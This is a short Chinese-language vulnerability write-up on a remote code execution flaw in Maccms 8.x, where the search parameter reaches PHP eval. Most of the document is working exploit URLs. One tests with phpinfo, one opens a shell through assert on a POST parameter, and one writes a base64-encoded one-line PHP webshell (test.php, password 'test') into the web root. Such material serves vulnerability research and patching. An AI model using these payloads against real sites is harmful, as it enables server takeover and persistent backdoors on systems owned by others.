# Maccms 8.x(苹果cms)命令执行漏洞

### 一、漏洞简介

搜索页面搜索参数过滤不严

导致直接eval执行PHP语句，前台命令执行可getshell

### 二、漏洞影响

Maccms 8.x

### 三、复现过程

**payload：**


```
http://url/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}
```

![](images/15891211472668.png)


getshell payload（a）:


```
http://url/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}

POST

a=phpinfo()
```

![](images/15891211645779.png)


写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）:


```bash
http://url/index.php?m=vod-search&wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A}
```